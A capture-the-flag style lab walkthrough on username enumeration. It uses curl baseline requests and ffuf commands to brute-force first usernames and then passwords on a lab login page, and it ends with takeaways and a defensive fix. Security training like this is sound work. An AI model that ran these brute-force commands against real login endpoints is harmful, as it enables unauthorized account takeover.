# Walkthrough — Username Enumeration via Different Responses

## Tools used
- `curl` — manual baseline requests, response diffing
- `ffuf` — automated username and password brute-force

## Step 1 — Establish a manual baseline

Before touching ffuf, send one login attempt with a username that is almost certainly
not in the candidate list, plus any wrong password, and look at the full response:

```bash
curl -i -X POST 'https://<lab-id>.web-security-academy.net/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=definitely-not-a-real-user' \
  --data-urlencode 'password=testtest'
```

Note the status code, and get a precise size/word count for comparison:

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X POST \
  'https://<lab-id>.web-security-academy.net/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=definitely-not-a-real-user' \
  --data-urlencode 'password=testtest'
```

**Reasoning:** you need a known-bad reference point before fuzzing, otherwise you
can't tell signal from noise once ffuf is running hundreds of requests. Guessing at
what "different" looks like, instead of measuring it first, wastes brute-force time
spent re-running attempts you can't interpret.

## Step 2 — Fuzz usernames, filtering out the baseline

```bash
ffuf -w usernames.txt:FUZZ \
  -u 'https://<lab-id>.web-security-academy.net/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=FUZZ&password=testtest' \
  -fw <baseline-word-count>
```

(`-fw` filters out responses with the same word count as the "no such user" baseline.
`-fs` — filter by byte size — or ffuf's `-ac` auto-calibration flag work the same way
and are good alternatives, particularly `-ac` for larger wordlists where you don't
want to hand-measure the baseline.)

One username's response survives the filter — its word count differs from every
other attempt, because the application's "wrong password" message is worded
differently from its "no such user" message. That is the valid username
(**`alabama`**, from the candidate usernames list).

**Reasoning:** the filter isn't picking a "correct" response by content — it's
removing everything that matches the known-bad shape, so whatever is left over is,
by elimination, the anomaly worth investigating.

## Step 3 — Fuzz passwords against the confirmed username

```bash
ffuf -w passwords.txt:FUZZ \
  -u 'https://<lab-id>.web-security-academy.net/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=alabama&password=FUZZ' \
  -fw <wrong-password-word-count>
```

Same logic as step 2, but now the username is fixed and correct, so the baseline to
filter out is "valid username, wrong password." The surviving response is a redirect
(302) to the authenticated account page, rather than the login page again — an
unmistakable signal once isolated.

## Step 4 — Access the account page

Using the session cookie returned by the successful login (either via curl's
`-c cookies.txt` jar or by logging in through the browser once the credentials are
known), navigate to `/my-account` to confirm the lab is solved.

## Key takeaways

- **Measure the baseline before fuzzing.** Eyeballing or guessing what the "boring"
  response looks like wastes attempts; one manual curl request tells you exactly what
  to filter.
- **Word count, byte size, and status code are three independent signals** — a
  discrepancy might show up in only one of them, so if filtering by size doesn't
  isolate anything, try words or status before assuming the endpoint isn't
  vulnerable.
- **ffuf's `-fs`/`-fw`/`-fl`/`-fc`/`-ft` filters remove the known-bad shape**, leaving
  the anomaly rather than requiring you to define what "correct" looks like in
  advance — useful because you often don't know the correct answer's shape until you
  see it.
- **`-ac` (auto-calibration)** automates the baseline-measurement step itself for
  large wordlists, at the cost of needing a sanity check against a manual filter the
  first time you rely on it, in case the "wrong" response isn't perfectly consistent.
- This attack only works because the app's two failure paths are **distinguishable at
  all** — the fix is making them identical in every dimension, not just the visible
  error text.
